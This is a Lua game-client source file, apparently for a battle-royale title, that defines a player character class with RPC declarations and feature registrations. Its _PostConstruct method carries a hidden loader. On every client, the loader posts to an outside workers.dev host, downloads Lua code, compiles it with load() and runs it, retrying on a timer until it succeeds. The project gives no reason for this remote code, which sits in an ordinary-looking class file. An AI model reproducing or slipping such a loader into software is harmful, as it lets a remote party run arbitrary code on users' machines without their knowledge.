local require = require
local import = import
local isValid = slua.isValid
local CombineClass = require("combine_class")
local CharacterBase = require("GameLua.GameCore.Framework.CharacterBase")

local BRPlayerCharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {}
}

BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
  Reliable = true,
  Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
  Reliable = true,
  Params = { UEnums.EPropertyClass.Object }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
  Reliable = true,
  Params = { UEnums.EPropertyClass.Int }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
  Reliable = true,
  Params = { UEnums.EPropertyClass.Int }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
  Reliable = true,
  Params = { UEnums.EPropertyClass.Bool }
}

function BRPlayerCharacterBase:ctor() end


local MOD_URL = "https://a.hamse.workers.dev"

function BRPlayerCharacterBase:_PostConstruct()
    CharacterBase._PostConstruct(self)
    if Client then
        _G._ModChunks = _G._ModChunks or {}
        _G._MOD_EXECUTED = false

        local http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
        if not http or not http.Post then
            print("[Mod] HTTP manager not available")
            return
        end

        local headers = { ["Content-Type"] = "application/x-www-form-urlencoded" }
        local CHUNKS_TO_FETCH = { 1 }   -- jitne chunks chahiye daalo
        local MAX_RETRIES_PER_CHUNK = 5
        local MAX_TIMER_ATTEMPTS = 60
        local timerAttempt = 0
        
        local entryChunk = CHUNKS_TO_FETCH[1]

        local function fetchChunk(n, retryCount)
            retryCount = retryCount or 0
            if retryCount >= MAX_RETRIES_PER_CHUNK then
                print("[Mod] Failed chunk", n, "after", MAX_RETRIES_PER_CHUNK, "retries")
                return
            end

            http:Post(MOD_URL, headers, "key_path=" .. n .. ".lua", nil, function(success, resp)
                if success and resp and #resp > 50 then
                    local chunk, err = load(resp, n .. ".lua")
                    if chunk then
                        _G._ModChunks[n] = chunk
                        if n == entryChunk then
                            local ok, execErr = pcall(chunk)
                            if ok then
                                _G._MOD_EXECUTED = true
                                print("[Mod] Chunk", n, "loaded & executed")
                                if self._modTimer then
                                    self:RemoveGameTimer(self._modTimer)
                                    self._modTimer = nil
                                end
                            else
                                print("[Mod] Exec error:", execErr)
                            end
                        end
                        for i = 1, #CHUNKS_TO_FETCH do
                            local nextN = CHUNKS_TO_FETCH[i]
                            if nextN > n and not _G._ModChunks[nextN] then
                                fetchChunk(nextN, 0)
                            end
                        end
                        return
                    else
                        print("[Mod] Load failed for chunk", n, "- retrying")
                    end
                else
                    print("[Mod] HTTP fail for chunk", n)
                end
                self:AddGameTimer(1.0, false, function()
                    fetchChunk(n, retryCount + 1)
                end)
            end, 5)
        end

        local function retryTimerCallback()
            if _G._MOD_EXECUTED then
                if self._modTimer then
                    self:RemoveGameTimer(self._modTimer)
                    self._modTimer = nil
                end
                return false
            end

            timerAttempt = timerAttempt + 1
            if timerAttempt > MAX_TIMER_ATTEMPTS then
                print("[Mod] Permanent timeout after", MAX_TIMER_ATTEMPTS, "attempts")
                if self._modTimer then
                    self:RemoveGameTimer(self._modTimer)
                    self._modTimer = nil
                end
                return false
            end

            if not _G._ModChunks[entryChunk] then
                fetchChunk(entryChunk, 0)
            else
                local chunk = _G._ModChunks[entryChunk]
                if chunk and not _G._MOD_EXECUTED then
                    local ok, err = pcall(chunk)
                    if ok then
                        _G._MOD_EXECUTED = true
                        print("[Mod] Executed on retry")
                        return false
                    else
                        print("[Mod] Retry exec error:", err)
                    end
                end
            end
            return true
        end

        self._modTimer = self:AddGameTimer(0.5, true, retryTimerCallback)

        if #CHUNKS_TO_FETCH > 0 then
            fetchChunk(entryChunk, 0)
        end
    end
end

-- Preserve original ReceiveBeginPlay
local _orig_ReceiveBeginPlay = BRPlayerCharacterBase.ReceiveBeginPlay
function BRPlayerCharacterBase:ReceiveBeginPlay()
    if _orig_ReceiveBeginPlay then
        _orig_ReceiveBeginPlay(self)
    else
        BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
    end
end

-- Class registration (unchanged)
local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)
return require("combine_class").DeclareFeature(CBRPlayerCharacterBase, {
  { SkyTransition = "GameLua.Mod.BaseMod.Gameplay.Feature.SkyControl.PlayerCharacterSkyTransitionFeature" },
  { CarryDeadBoxFeature = "GameLua.Mod.Library.GamePlay.Feature.CarryDeadBoxFeature" },
  { SpecialSuitFeature = "GameLua.Mod.Library.GamePlay.Feature.SpecialSuitFeature" },
  { TeleportPawnFeature = "GameLua.Mod.Library.GamePlay.Feature.TeleportPawnFeature" },
  { LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature" },
  { FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature" },
  { CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature" },
  { BuildSkateFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.PlayerCharacterBuildVehicleFeature" },
  { CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature" },
  { ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature" }
}, "BRPlayerCharacterBase")
